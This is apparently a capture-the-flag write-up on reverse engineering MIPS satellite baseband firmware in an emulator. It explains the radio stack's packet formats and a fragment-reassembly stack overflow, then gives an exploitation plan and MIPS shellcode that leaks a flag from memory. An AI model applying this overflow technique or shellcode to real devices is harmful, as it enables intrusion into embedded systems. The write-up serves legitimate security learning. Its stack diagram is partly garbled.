From `notes.txt` that comes with the challenge files:
```
Our team managed to download off an open FTP server from LaunchDotCom's website
and found some interesting documents about their upcoming Satellte Internet
service. We've figured out how to communicate over the RF link but we need your
help to figure out how to exploit the baseband processor on the satellite.

We've managed to download the firmware for the baseband processor of the
payload module from the open FTP server.

It appears they graciously left an emulator on their public FTP server for
debugging their platform, we have provided that as well. Our team has
determined that the target system uses 2MB of RAM and to run the emulator use
the following command line:

vmips -o memsize=2097152 firmware.bin

Our team would like to access sensitive data located 0xa2008000 on the running system.

Good Luck!
```

The challenge is a [baseband processor](https://en.wikipedia.org/wiki/Baseband_processor) firmware built on MIPS architecture. We
are given an emulator to go with it to run it on an x86 system. The emulator
is modified to map a flag device on memory that is meant to be read by
exploiting the firmware.

First off, the emulator is supposed to have a 
gdb stub for remote debugging, but it does not work. I'm not sure if this
 is intentional but many people reported this issue and there were no updates
 to the challenge, so I'm gonna have to assume that it was intentional. I've
tried running it with a public vmips build, but it crashed. At this point I 
had some options:

- Get the firmware to work with a public vmips build and use debugger.
- Instrument the modified vmips build and build my own debugger on top of the
  emulator.
- Modify the firmware, overwrite instructions with break and load vmips'
  register and memory dumps into r2 and statically analyze states.

Because I'm a lazy bum, I opted for the last option. Needless to say that in
the long run this was a very tiring process, but I kept at it. Since I haven't
tried the other approaches, I'm blissfully happy with my ignorance.

# Reverse Engineering the Firmware

## vmips

vmips is an open-source MIPS emulator project. The modified version is crippled
in debugger department, but the rest of the functionality is still intact.
Register and memory dumps were essential in solving the challenge. Here are
some useful options that I used during the process(The complete list can be
found on the project's webpage<sup>[1](http://vmips.sourceforge.net/vmips/doc/vmips.html)</sup>
):

- haltdumpcpu: This option enables dumping registers whenever the emulation is
  terminated. Also applies to break instructions. I used this option
  extensively when I was analyzing states.
- memdump: Enables memory dumping whenever the emulation is terminated.
- instdump: Instruction trace. This option was not too useful except at the
  beginning where I didn't know if the firmware was actually running or not
  :). Since the firmware was running realtime, the instruction trace could
  easily stack up to hundreds of megabytes, so it wasn't really practical in a
  way that was useful for me.

## The Firmware

The firmware handles connections through UART interface. The most important
thing about it is that it actually comes with debug messages, which are
triggered constantly but never seen on the output. Even so, they were extremely
useful in identifying structures and procedures in static analysis.

## Debug Messages

As I've confirmed with instruction trace, there is actually a constant stream
of debug messages to the output. However, the debug printf function
(`0xbfc017e0`) checks verbosity level (`0xa0180050`) and since the value is zero,
nothing makes its way to the output. I nop'ed the check to get debug output.
After this point it was a lot easier to see what the firmware was doing with my
inputs.

</div>

I also used the string references in the static disassembly to understand the
functions of different branches. I've spent most of my time on this approach.

## Static Analysis

For disassembly and static analysis I used r2 with r2ghidra plugin. They both
worked great to a certain extent. There were a couple crashes that set me back
a little bit, but its all good in the end. I loaded the firmware with the
following parameters:

```
$ r2 -a mips -m 0xbfc00000 -b 32 challenge.rom
```

ROM itself is kinda useless without the RAM because the firmware copies itself
onto RAM in the initialization stage<sup>[2](http://citeseerx.ist.psu.edu/viewdoc/download?doi=10.1.1.534.3259&rep=rep1&type=pdf)</sup>
and the referenced strings are the ones
on RAM. Thus I also need to map the RAM. That's where the memdump.bin
generated by vmips comes in handy. A memdump of any state in the execution
should be enough(Just hit CTRL+\ while vmips is running the firmware with '-o
memdump' option.). I mapped memdump.bin using the following command in r2
shell:

```
[0xbfc00000]> on ./memdump.bin 0xa0000000
```

Firmware's entry point is 0xbfc00000, so this is where I started the analysis.
I went with the usual, totally not over-the-top analysis r2:

```
[0xbfc00000]> aaaaaa
```

R2 identified pretty much every function within the firmware. This was a great
starting point. Using the vmips documents<sup>[2](http://citeseerx.ist.psu.edu/viewdoc/download?doi=10.1.1.534.3259&rep=rep1&type=pdf)</sup>
, I found the main function
(`0xbfc08de0`) and started reversing.

## Calling Convention and Decompilation

Function arguments are passed through a0-a3 registers<sup>[3](http://www.cs.uwm.edu/classes/cs315/Bacon/Lecture/HTML/ch05s03.html)</sup> and the stack. The
return register is v0. In the firmware, functions rarely use the stack so the
arguments are fairly easy to track. With correct argument types and struct
definitions, the decompiler output can transform from this:

```
:> pdg

undefined4 fcn.bfc01aac(int32_t param_1)
{
    undefined4 uVar1;
    
    if (*(int32_t *)(param_1 + 0x10) != 0) {
        uVar1 = fcn.bfc0802c();
        *(int32_t *)(param_1 + 0x10) = *(int32_t *)(param_1 + 0x10) + -1;
        return uVar1;
    }
    return 0;
}
```

to this:

```
:> to defs.h
:> afvr a0 queue queue_struct*
:> pdg

undefined4 fcn.bfc01aac(queue_struct *queue)
{
    undefined4 uVar1;

    if (queue->entry_count != 0) {
        uVar1 = fcn.bfc0802c();
        queue->entry_count = queue->entry_count - 1;
        return uVar1;
    }
    return 0;
}
```

It's not without its problems though, at the time of writing this, r2ghidra
would crash whenever I used recursive data structures, so I had to use integer
types for linked list pointers like prev and next.

# High-Level Logic

The firmware is a custom radio network stack implementation. After initializing
the structures of each layer, it goes into an infinite loop, iterating through
each layer's queue and processing packets.

The network stack consists of three layers:

- MAC (?) @`0xbfc085ec`
- RLL (Radio Link Layer) @`0xbfc015e0`
- RRL (Radio Resource Layer) @`0xbfc02b9c`

Most of the logic that is relevant to the exploitation is given by the following 
diagram:

```

## Queues

Each consecutive layer has two one-way queue to the next to exchange packets.
These queues have simple structures:

```c
struct queue_struct {
    uint32_t queue_size;
    struct queue_node *head;
    struct queue_node *tail;
    char *queue_name;
    uint32_t unk1;
};
```

Each node points to a data chunk:

```c
struct queue_node {
    uint32_t next;
    uint32_t prev;
    uint32_t curr_queue;
    struct queue_packet *packet;
    uint32_t packet_size;
    void *destructor_fcn;
};
```

And each data chunk has a type, a timestamp and the data itself:

```c
struct queue_packet {
    uint8_t  type;
    uint32_t timestamp;
    char     data[PDU_SIZE-3];
};
```

Keep in mind that queue packets have types just like network packets. Unlike
network packets, these types are assigned internally.

## MAC Layer

MAC layer is the first layer of the network stack. It reads the input from UART
interface and reassembles PDUs, then processes these PDUs according to their
types.

```c
struct mac_struct {
    uint32_t max_pdu_size;                      // 0x0
    uint32_t min_pdu_size;                      // 0x4
    uint32_t default_pdu_size;                  // 0x8
    uint32_t MAC_PDU_DATA_BLOCK_TYPE;           // 0xc
    uint32_t MAC_PDU_SET_DATA_BLOCK_SIZE_TYPE;  // 0x10
    uint32_t MAC_PDU_RESET_TYPE;                // 0x14
    uint32_t unk1;                              // 0x18
    uint32_t unk2;                              // 0x1c
    uint32_t init_time;                         // 0x20
    uint32_t unk3;                              // 0x24
    uint32_t curr_time;                         // 0x28
    uint32_t send_time;                         // 0x2c
    uint32_t uart_io;                           // 0x30
    struct queue_struct *macrll_queue;          // 0x34
    struct queue_struct *rllmac_queue;          // 0x38
    struct queue_struct *global_queue;          // 0x3c, not used
    char     pdu_buffer[0x180];                 // 0x40
    uint16_t curr_pdu_buffer_size;              // 0x1c0
    uint8_t  curr_pdu_size;                     // 0x1c2
    uint8_t  padding;                           // 0x1c3
    uint32_t received_packet_count;             // 0x1c4, max 20
    uint32_t uninitialized_flag;                // 0x1c8
};
```


There are three input PDU types that are handled by MAC layer:

```
  Type                                                                pdu length
0      1         3                                                 (default 0x20)
+------+---------+-------------------------------------------------------------+
| 0x13 |  crc16  |                         discarded                           |
+------+---------+-------------------------------------------------------------+
```

Type 0x13 resets the pdu size and sends a message to RLL layer to reset the PDU
pool. This essentially resets the connection.

```
0      1         3              4
+------+---------+--------------+----------------------------------------------+
| 0x79 |  crc16  |  new length  |                discarded                     |
+------+---------+--------------+----------------------------------------------+
```

Type 0x79 packets set a new PDU size. This size is limited by a min and a max
value. Minimum and maximum values are 0x10 and 0xc0, respectively. Size is also
required to be a multiple of 4.

```
0      1         3
+------+---------+-------------------------------------------------------------+
| 0xe3 |  crc16  |                       rll data block                        |
+------+---------+-------------------------------------------------------------+
```

Type 0xe3 packets hold new data blocks to be processed by the RLL layer.

MAC layer also checks the RLLMAC queue and sends any waiting packet to the
UART output.

The crc16 variant in use is X-25 (`0xbfc083b0`).

## RLL Layer

RLL is the layer responsible for the encryption and reassembling big messages
that arrive in parts(dedicated messages). By default, encryption is not enabled
and without encryption, dedicated and fast messages are discarded.

```c
struct rll_struct {
    void *pdu_pool;                     // 0x00
    uint32_t last_item;                 // 0x04
    uint32_t pool_item_count;           // 0x08
    uint32_t dedicated_pool_item_count; // 0x0c, ??
    struct dedicated_queue_struct dedicated_queue;
    uint32_t unk7;                      // 0x1c
    uint32_t current_time;              // 0x20
    uint32_t unk8;                      // 0x24
    uint32_t last_packet_time;          // 0x28
    uint32_t time_passed;               // 0x2c
    uint8_t pdu_size;                   // 0x30
    uint8_t encryption_enabled;         // 0x31
    uint8_t unk11;                      // 0x32
    uint8_t unk12;                      // 0x33
    uint8_t some_key[16];               // 0x34
    uint32_t unk17;                     // 0x44
    uint8_t decryption_key[8];          // 0x48
    uint8_t encryption_key[8];          // 0x4c
    uint32_t sequence_number;           // 0x58
    uint32_t unk23;                     // 0x5c
    uint32_t received_packet_count;     // 0x60, max 0xf0
    struct queue_struct *macrll_queue;  // 0x64
    struct queue_struct *rllrrl_queue;  // 0x68
    struct queue_struct *rllmac_queue;  // 0x6c
    struct queue_struct *rrlrll_queue;  // 0x70
    struct queue_struct *global_queue;  // 0x74, not really used
};
```

RLL layer processes three types of queue packets from MACRLL queue (0xbfc01454):

- 0x4a: Update the timestamp.
- 0x31: Initialize the PDU pool that keeps incoming data blocks.
- 0x37: New data block.

RLL data blocks extracted from 0x37 type packets have three types:

```
  Type
0      1      2                                        0x62       pdu length - 3
+------+------+-----------------------------------------+----------------------+
| 0x17 | 0x70 |       encryption primitive              |      discarded       |
+------+------+-----------------------------------------+----------------------+
```

Type 0x17 packets initialize and enable encryption.

```
  Type                                                            pdu length - 3
0      1                                                           (default 0x1d)
+------+-----------------------------------------------------------------------+
| 0xc3 |                             data                                      |
+------------------------------------------------------------------------------+
       ^-------------------------+ENCRYPTED+-----------------------------------^
```

Type 0xc3 packets carry fast messages. These messages are contained within one
packet and are enqueued in RLLRRL queue immediately after decryption.

```
  Type                                                            pdu length - 3
0      1               3                                           (default 0x1d)
+------------------------------------------------------------------------------+
| 0x73 |  sequence no  |                   data fragment                       |
+------------------------------------------------------------------------------+
       ^-------------------------+ENCRYPTED+-----------------------------------^
```

Type 0x73 packets carry fragments of dedicated messages. These fragments are
kept in the pdu pool until a packet arrives with end flag.

### Dedicated Messages

Dedicated messages arrive in fragments, and these fragmented messages have
sequence numbers. These numbers are actually three values packed in 16 bits:

```
0           1                                       12                        16
+-----------+----------------------------------------+-------------------------+
|  end bit  |            sequence window             |       fragment no       |
+-----------+----------------------------------------+-------------------------+
```

- end bit: Marks the end of fragments. When a packet with end bit arrives, all
  fragments of the same sequence window will be reassembled (`0xbfc04414`).

- sequence window: Each dedicated message has a sequence window that allows up
  to 16 fragments.

- fragment no: Order of the fragment in the sequence window.

## RRL layer

This layer deals with setting up APs and encryption. I haven't gone deep into
it, except for the encryption initialization procedure(which I failed to
understand how it works). Because the vulnerability is in the RLL layer, the
exploit interacts with RRL layer only briefly.

### Encryption

The packets are encrypted (`0xbfc00a30`) and decrypted (`0xbfc00ac0`) with simple
xor, however there are key initialization and key update mechanisms. The xor
keys are updated every 8 bytes. Honestly I couldn't make much sense of what's
going on in initialization and update mechanisms, so I took a shortcut. There
is no randomness and the key initialization ends up with the same xor keys when
I send the same packet, so I just reimplemented the key update function and
snatched the initial keys from a memdump.

```c
uint32_t decrypt_block(rll_struct *rll_struct, char *data, uint32_t len)
{
    uint8_t *puVar1;
    uint32_t uVar2;
    uint8_t *puVar3;
    uint8_t *puVar4;
    uint8_t *puVar5;
    uint32_t uVar6;

    uVar6 = (uint32_t)rll_struct->encryption_enabled;
    if (uVar6 != 0) {
        puVar3 = (uint8_t *)(data + len);
        puVar4 = rll_struct->decryption_key;
        puVar5 = rll_struct->some_key;
        puVar1 = (uint8_t *)data;
        while (puVar3 != puVar1) {
            uVar2 = (uint32_t)(puVar1 + -(int32_t)data) & 7;
            if (uVar2 == 0) {
                update_key(rll_struct, puVar4, puVar5);
            }
            *puVar1 = puVar4[uVar2] ^ *puVar1;
            puVar1 = puVar1 + 1;
        }
        return uVar6;
    }
    return 0;
}
```

# The Vulnerability

I've talked about the inner workings that are relevant to the exploit. Now it's
time to talk about the vulnerable part of this application.

## Fragment Reassembly

Normally, when a packet with end bit arrives, the function that reassembles the
fragments (`0xbfc04414`) first checks if the total length of the fragments are
smaller than the maximum size allowed(which is 0x500=1280)(`0xbfc043c0`).

```c
undefined4 reassemble_packets(dedicated_queue_node *dedicated_msg, char *begin,
                              uint32_t size, char *end)
{
    uint32_t uVar1;
    undefined4 uVar2;
    undefined4 *puVar3;
    uint32_t *puVar4;
    int32_t iVar5;
    
    uVar1 = calculate_total_size(dedicated_msg);
    uVar2 = 0;
    if (uVar1 <= size) {
        puVar4 = dedicated_msg->fragment_pool;
        iVar5 = 0;
        do {
            puVar3 = (undefined4 *)*puVar4;
            if (puVar3 != (undefined4 *)0x0) {
                memcpy(begin + iVar5, *puVar3, *(undefined *)(puVar3 + 1));
                iVar5 = iVar5 + (uint32_t)*(uint8_t *)(*puVar4 + 4);
            }
            puVar4 = puVar4 + 1;
            uVar2 = 1;
        } while (puVar4 != (uint32_t *)&dedicated_msg->sequence_window);
        *(int16_t *)end = (int16_t)iVar5;
    }
    return uVar2;
}

int16_t calculate_total_size(dedicated_queue_node *dedicated_msg)
{
    int16_t iVar1;
    uint32_t uVar2;
    int32_t iVar3;
    
    iVar1 = 0;
    uVar2 = 0;
    iVar3 = 4;
    do {
        if ((&dedicated_msg->next)[iVar3] != 0) {
            iVar1 = iVar1 + (uint16_t)*(uint8_t *)((&dedicated_msg->next)[iVar3] + 4);
        }
        uVar2 = uVar2 + 1 & 0xff;
        iVar3 = uVar2 + 4;
    } while (uVar2 <= dedicated_msg->end_fragment_no);
    return iVar1;
}
```

The critical fault here is that the check only sums the fragments up to the one
with end flag enabled. However, it is possible to send fragments with bigger
fragment numbers before sending the terminating fragment. The fragments with
higher fragment numbers than the terminating fragment will not be added to the
total length, allowing me to reassemble a dedicated message bigger than
the available buffer(maximum message size * 16 > 1280, even 7 fragments will
overflow the buffer). Even better, the reassembly function uses the *stack* to
reassemble the fragments, so the message will overflow into the stack.

## Exploitation

It's time to implement everything above to exploit the vulnerability. Here's
how the exploit will interact with the firmware:

- set the current PDU size to maximum (0xc0)
- initialize and enable encryption
- send the fragments 0-3, with nop sleds as data (not actually used, but just in case)
- send the fragments 5-9, with shellcode address as data
- send the fragment 4 with end flag, with shellcode as data
- read the flag
- profit

I opened a memdump after overflowing the stack and got the necessary offsets.
The message will look like this after its reassembly:

```
+--------------+-->Beginning of the dedicated
|  0x00000000  |   message buffer
|  0x00000000  |
|  0x00000000  |

|     NOP      |
|     sled     |
|              |
|  0x00000000  |
|  0x00000000  |
|      .       |
|      .       |
|      .       |

|              |
|              |

|              |
|              |
|              |

|  0xa00fea7c  |
|  0xa00fea7c  |

|  0xa00fea7c  |  |message buffer

|   repeated   |  |
|   shellcode  |  +

|              | other functions

|  0xa00fea7c  |  |
|      .       |  |
|      .       |  |
|      .       |  |
+--------------+-->
```

Fortunately, the return address is picked up and the program executes the
shellcode without any additional manipulation.

### The Shellcode

Since there is already a write function at my disposal (`0xbfc08cbc`), I only need to set the arguments straight
and branch right into it. One little problem I experienced: The write function
wasn't able to give me the flag at once. That's why I modified the shellcode to
call write with length=1 and iterate over the flag.

```
/* this should only be executed once */
move $s0, $zero

/* load buffer address into a1 */
lui $a1, 0xa200
add $a1, $a1, 0x8000

/* add current offset */
add $a1, $a1, $s0
add $s0, $s0, 1

/* load uart io into a0 */
lui $a0, 0xa00f
add $a0, $a0, 0xecfc

/* load buffer len into a2 */
add $a2, $zero, 1

/* load output function address into a3 */
lui $a3, 0xbfc0
add $a3, $a3, 0x8cbc

/* set up the loop,
   return address will be 
   the second instruction */
lui $ra, 0xa00f
add $ra, $ra, 0xea80

/* branch into output function */
jr $a3
nop
```
